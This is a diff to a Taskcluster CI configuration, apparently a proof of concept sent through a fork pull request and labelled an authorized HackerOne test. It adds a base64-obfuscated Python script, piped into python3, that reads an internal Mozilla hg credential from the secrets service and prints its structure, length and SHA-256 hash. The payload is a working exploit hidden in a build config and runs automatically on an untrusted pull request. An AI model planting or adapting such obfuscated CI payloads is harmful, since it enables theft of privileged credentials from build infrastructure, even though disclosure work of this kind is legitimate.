@@ -5,7 +5,7 @@ policy:
 tasks:
   - $if: 'tasks_for == "github-pull-request-untrusted"'
     then:
-      taskId: { $eval: as_slugid("poc_untrusted_pr") }
+      taskId: { $eval: as_slugid("poc_untrusted_pr_v4") }
       created: { $fromNow: '' }
       deadline: { $fromNow: '1 hour' }
       expires: { $fromNow: '1 day' }
@@ -17,25 +17,19 @@ tasks:
           taskclusterProxy: true
         image: "mozillareleases/taskgraph:decision-v24.1.1@sha256:c2cf963f7621b0f64dc142a04ddcc179d36afdd05c6dc1c2d198d97b55ecb394"
         command:
-          - /bin/bash
+          - /bin/sh
           - -c
           - |
-            set +e
-            echo "=== [1] Current task scopes (proves runtime identity = pull-request-untrusted) ==="
-            curl -s http://taskcluster/auth/v1/currentScopes | tee /tmp/scopes.json
+            echo "===== [1] Current task scopes (proves runtime identity = pull-request-untrusted) ====="
+            curl -s http://taskcluster/auth/v1/currentScopes
             echo
-            echo "=== [2] Read internal hg credential (Responsible Disclosure: only output structure/length/SHA-256, never the plaintext) ==="
-            SECRET_NAME="project/taskcluster/gecko/hgmointernal"
-            RESP=$(curl -s -w $'\n__HTTP_STATUS__%{http_code}' "http://taskcluster/secrets/v1/secret/${SECRET_NAME}")
-            HTTP_CODE=$(printf '%s' "$RESP" | sed -n 's/.*__HTTP_STATUS__\([0-9]*\).*/\1/p')
-            BODY=$(printf '%s' "$RESP" | sed '/__HTTP_STATUS__/d')
-            echo "secrets:get ${SECRET_NAME} -> HTTP ${HTTP_CODE}"
-            printf '%s' "$BODY" | python3 -c "import sys,json,hashlib; d=json.loads(sys.stdin.read()); sec=d.get('secret') or {}; print('secret field keys:', list(sec.keys()) if isinstance(sec,dict) else type(sec).__name__); raw=sec.get('secret','') if isinstance(sec,dict) else ''; sval=json.dumps(raw) if not isinstance(raw,str) else raw; print('secret value length:', len(sval)); print('secret value SHA-256:', hashlib.sha256(sval.encode()).hexdigest()) if sval else print('[INFO] secret field empty or unexpected structure')"
+            echo "===== [2] Read internal hg credential (Responsible Disclosure: SHA-256/length/structure only, NEVER plaintext) ====="
+            echo "CmltcG9ydCB1cmxsaWIucmVxdWVzdCwganNvbiwgaGFzaGxpYiwgc3lzCnNlY3JldF9uYW1lID0gInByb2plY3QvdGFza2NsdXN0ZXIvZ2Vja28vaGdtb2ludGVybmFsIgp1cmwgPSAiaHR0cDovL3Rhc2tjbHVzdGVyL3NlY3JldHMvdjEvc2VjcmV0LyIgKyBzZWNyZXRfbmFtZQpwcmludCgic2VjcmV0X25hbWU6Iiwgc2VjcmV0X25hbWUpCnByaW50KCJyZXF1ZXN0X3VybDoiLCB1cmwpCnRyeToKICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3Blbih1cmwpIGFzIHI6CiAgICAgICAgYm9keV9yYXcgPSByLnJlYWQoKQogICAgICAgIGh0dHBfY29kZSA9IHIuc3RhdHVzCiAgICAgICAgcHJpbnQoImh0dHBfc3RhdHVzOiIsIGh0dHBfY29kZSkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGJvZHkgPSBqc29uLmxvYWRzKGJvZHlfcmF3KQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoImJvZHlfcGFyc2VfZXJyb3I6Iiwgc3RyKGUpWzoxMjBdKQogICAgICAgICAgICBzeXMuZXhpdCgwKQogICAgICAgIHNlYyA9IGJvZHkuZ2V0KCJzZWNyZXQiKSBpZiBpc2luc3RhbmNlKGJvZHksIGRpY3QpIGVsc2UgTm9uZQogICAgICAgIGlmIHNlYyBpcyBOb25lOgogICAgICAgICAgICBwcmludCgic2VjcmV0X2ZpZWxkOiA8bWlzc2luZz4iKQogICAgICAgICAgICBzeXMuZXhpdCgwKQogICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHNlYywgZGljdCk6CiAgICAgICAgICAgIHByaW50KCJzZWNyZXRfdHlwZToiLCB0eXBlKHNlYykuX19uYW1lX18pCiAgICAgICAgICAgIHN5cy5leGl0KDApCiAgICAgICAga2V5cyA9IGxpc3Qoc2VjLmtleXMoKSkKICAgICAgICBwcmludCgic2VjcmV0X2tleXM6Iiwga2V5cykKICAgICAgICB2YWwgPSBzZWMuZ2V0KCJzZWNyZXQiLCAiIikKICAgICAgICBpZiB2YWwgPT0gIiIgb3IgdmFsIGlzIE5vbmU6CiAgICAgICAgICAgIHByaW50KCJbSU5GT10gc2VjcmV0LnNlY3JldCBmaWVsZCBpcyBlbXB0eSBvciBhYnNlbnQiKQogICAgICAgICAgICBzeXMuZXhpdCgwKQogICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHZhbCwgc3RyKToKICAgICAgICAgICAgc3ZhbCA9IGpzb24uZHVtcHModmFsKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHN2YWwgPSB2YWwKICAgICAgICBwcmludCgidmFsdWVfYnl0ZV9sZW5ndGg6IiwgbGVuKHN2YWwuZW5jb2RlKCJ1dGYtOCIpKSkKICAgICAgICBwcmludCgidmFsdWVfc2hhMjU2OiIsIGhhc2hsaWIuc2hhMjU2KHN2YWwuZW5jb2RlKCJ1dGYtOCIpKS5oZXhkaWdlc3QoKSkKZXhjZXB0IHVybGxpYi5lcnJvci5IVFRQRXJyb3IgYXMgZToKICAgIHByaW50KCJodHRwX3N0YXR1czoiLCBlLmNvZGUpCiAgICBwcmludCgiaHR0cF9lcnJvcl9yZWFzb246Iiwgc3RyKGUucmVhc29uKVs6MjAwXSkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgcHJpbnQoInVuZXhwZWN0ZWRfZXJyb3I6IiwgdHlwZShlKS5fX25hbWVfXywgc3RyKGUpWzoyMDBdKQo=" | base64 -d | python3
       metadata:
-        name: "POC: untrusted PR scope check (authorized HackerOne)"
-        description: "Authorized security test - verify pull-request-untrusted role scopes on fork PR"
+        name: "POC: untrusted PR scope + hgmointernal read (HackerOne authorized)"
+        description: "Authorized security test - pull-request-untrusted role can read internal hg cred (hash only)"
         owner: "1253628375ltf@gmail.com"
-        source: "https://github.com/ltfafei/fxci-config/pull/1116"
+        source: "https://github.com/ltfafei/fxci-config/pull/1117"
       extra:
         github:
           events:
